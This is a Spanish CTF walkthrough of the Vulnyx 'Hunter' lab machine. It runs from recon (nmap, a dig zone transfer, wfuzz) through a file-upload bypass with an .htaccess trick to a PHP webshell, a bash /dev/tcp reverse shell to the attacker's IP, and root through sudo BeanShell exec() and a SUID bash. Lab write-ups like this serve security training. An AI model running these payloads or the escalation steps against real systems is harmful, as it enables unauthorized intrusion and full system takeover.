@@ -1,0 +1,169 @@
+>>>Vulnyx
+>>Hunter
+
+>nmap
+
+>nmap -p 22,53,80 -sS -sC -sV  -n -Pn (IP victima) -oN nmap
+•22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u3 (protocol 2.0)
+•53/tcp open  domain  (unknown banner: not currently available)
+•80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+| http-robots.txt: 1 disallowed entry 
+|_hunterzone.nyx
+
+
+En el puerto 80 vemos que tenemos "robots.txt" y un subdominio llamado "hunterzone.nyx"
+
+Dentro del puerto 80 vemos que tenemos un apache, y dentro de "/robotx.txt" tenemos lo siguiente:
+
+•User-agent: *
+•Disallow: hunterzone.nyx
+
+
+Iremos a hacer fuzzing y luego probaremos el subdominio.
+
+>fuzzing
+
+>dirb http://(IP victima)
+
+• http://(IP victima)/index.html (CODE:200|SIZE:10700)                                                            
+• http://(IP victima)/robots.txt (CODE:200|SIZE:39)    
+
+
+Como no encontramos algo de utilidad, porcedemos a asociar el subdominio a la IP a ver que encontramos.
+
+>nano /etc/hosts
+
+•(IP victima)	hunterzone.nyx
+
+Tampoco encontramos nada interesante, pasaremos a buscar subdominios, para esto utilizaremos "wfuzz" porque es mas practica para apuntar a un lugar en la URL
+
+>wfuzz --hc 404  -u http://FUZZ.hunterzone.nyx -w /usr/share/amass/wordlists/subdomains-top1mil-20000.txt
+
+Con wfuzz no tuvimos resultados. Procederemos a buscar otra manera. 
+Viendo por internet, encontramos que podemos utilizar la herramienta "dig" la cual, a traves del protocolo DNS encuentra subdominios relacionados con la pagina
+
+>dig axfr hunterzone.nyx @(IP victima)
+
+Y encontramos varios subdominios:
+
+•ns1.hunterzone.nyx. 
+•root.hunterzone.nyx.
+•devhunter.nyx
+•admin.hunterzone.nyx.
+•cloud.hunterzone.nyx.
+•ftp.hunterzone.nyx.
+
+
+Estos ahora debemos relacionarlos con el numero de  IP dentro de "/etc/hosts". Al intentar encontrar subdominios en cada dominio relacionado con el DNS, encontramos que en "devhunter.nyx" obtuvimos respuesta favorable.
+
+>wfuzz -c --hc=400 --hl=367 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -H "Host: FUZZ.devhunter.nyx" -u (IP victima)
+
+•00000094:   200        26 L     51 W       525 Ch      "files"
+
+Quedaria "files.devhunter.nyx"
+
+ahora tenemos que sumarlo al /etc/hosts
+
+>nano /etc/hosts
+•(IP victima)	files.devhunter.nyx
+
+Al ingresar en "http://files.devhunter.nyx" encontramos un panel donde se pueden subir archivos.
+
+Intentamos subir una reverseshell en php y nos da problemas (:C) asi que interceptaremos con Burpsuite para mediante fuerza bruta encontrar un tipo de archivo permitido en este panel.
+
+>colocamos un archivo dentro del casillero
+>interceptamos con burpsuite 
+>damos a "enviar" y ahora burpsuite obtiene la peticion
+>damos click derecho y enviamos a "intruder"
+>entramos en "intruder"
+>donde encontramos la rut a "filename=pentestmonkey.php" es donde haremos el ataque
+>seleccionamos "php" y colocamos "add" para marcar que ahi se hara el ataque.
+>cargamos el payload, el cual es una wordlist de extenciones 
+>https://github.com/InfoSecWarrior/Offensive-Payloads/blob/main/File-Extensions-Wordlist.txt
+>ahora le damos a burpsuite cual es la respuesta erronea para que este lo tenga en cuenta.
+>settings
+>grep-extract
+>marcamos el texto que marca el error, en este caso "extension not allowed"
+**nota: quitar el url-encode que viene por defecto activado en payload**
+>start atack
+
+Vemos que las extensiones ".png" y "PNG" son aptas para cargar un archivo.
+
+Procedemos a crear una webshell dentro de un archivo ".png"
+
+>nano webshell.png
+
+**
+<?php
+        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
+?>
+**
+
+subimos el archivo y en efecto, no nos genera problama pra subirlo. Ahora debemos encontrar el archivo uplodeado para que funcione.
+
+Al colocar "/uploads" nos damos cuenta que es la ruta porque nos da el siguiente mensaje:
+
+> You don't have permission to access this resource.
+
+Al intentar acceder a nuestro archivo mediante la ruta "/uploads/webshell.png" nos muestra el siguiente mensaje:
+
+> the image "http://files.devnunter.nyx/uploads/webshell.png" cannot bve displayed because it tontains error
+
+esto nos indica que no podemos ejecutar el archivo .png, esto se debe a un protocolo de seguridad en servidores apache llamado "htaccess".
+Por lo tanto, para evitar este control, tenemos que subir un nuevo archivo ".htaccess" con el siguiente codigo
+
+>AddType application/x-httpd-php .png
+
+De esta forma le decimos al servidor que procese los archivos ".png"
+
+Perfecto. Ya tenemos una webshell :D ahora ingresando la siguiente ruta obtenemos resultados
+
+>http://files.devhunter.nyx/uploads/webshell.png?cmd=(((payload)))
+
+>http://files.devhunter.nyx/uploads/webshell.png?cmd=whoami
+•bug
+
+**esto nos indica que tenemos una webshell con el usuario "bug" 
+
+Ahora, lo ideal seria crear una reverseshell. Al tener ejecucion de comandos via webshell directamente podemos crear la reverseshell en la misma URL, pero para que esto funcione, necesitamos que este urlencodeada.
+
+>bash -c "bash -i >& /dev/tcp/(IP atacante)/443 0>&1"
+
+Ya tenemos la reverseshell con el usuario "bug". Ahora a hacer el tratamiento de la TTY 
+
+>script /dev/null -c bash
+>control+Z
+>stty raw -echo; fg
+>reset xterm
+>export TERM=xterm
+>export SHELL=bash
+
+ahora vemos que no tenemos mucha opcion para ejecutar comandos. Tenemos que subir de privilegios
+
+>sudo -l
+•(root) NOPASSWD: /usr/bin/bsh
+
+Vemos que podemos ejecutar "/bsh" como root sin permisos. Al ejecutarlo, vemos que el programa se llama "BeanShell" y que abre una pseudoconsola.
+
+>BeanShell 2.0b4
+
+Al buscarlo, encontramos el siguiente archivo donde nos explica cada comando a utilizar aqui
+
+http://beanshell.org/manual/bshcommands.html
+
+Vemos que ejecutando el comando "exec()" podremos ejecutar cualquier comando. Por lo tanto, haremos que como root ejecutemos comandos de la siguiente manera:
+
+>sudo -u root /usr/bin/bsh
+>exec("whoami");
+•root 
+**Ya somos root :D**
+
+Ahora para poder buscar la flag, como nosotros tenemos el usuario "bug" procederemos a darnos permisos de root en ese usuario
+
+>exec("chmod u+s /bin/bash");
+
+Ahora, nos tenemos que lanzar una bash como root. Se hace de la siguiente forma:
+
+>bash -p
+>whoami
+•root"
